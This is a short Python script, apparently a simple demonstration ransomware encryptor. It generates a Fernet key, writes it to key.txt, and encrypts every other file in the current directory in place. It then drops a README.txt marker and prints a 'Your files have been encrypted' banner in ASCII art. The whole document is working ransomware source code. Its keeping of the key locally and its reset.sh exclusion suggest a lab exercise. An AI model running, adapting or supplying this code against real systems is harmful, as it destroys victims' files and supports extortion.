#!/usr/bin/env python3

from art import *
import os
from cryptography.fernet import Fernet


if "README.txt" in os.listdir():
	print("Files have already been enrypted")
else:
	key = Fernet.generate_key()

	with open("key.txt", "wb") as k:
		k.write(key)

	files = []

	for f in os.listdir():
		if f == "key.txt" or "encrypt.py" in f or "decrypt.py" in f or f == "reset.sh":
			pass
		else:
			files.append(f)	
	with open("README.txt", "w") as f:
		f.write("encrypted=true")
	for f in files:
		with open(f, "rb") as thefile1:
			contents = thefile1.read()
		encrypted_contents = Fernet(key).encrypt(contents)
		with open(f, "wb") as thefile2:
			thefile2.write(encrypted_contents)
	fon = "cybermedium"
	tprint("Your files", font = fon)
	tprint("have been", font = fon)
	tprint("encrypted", font = fon)

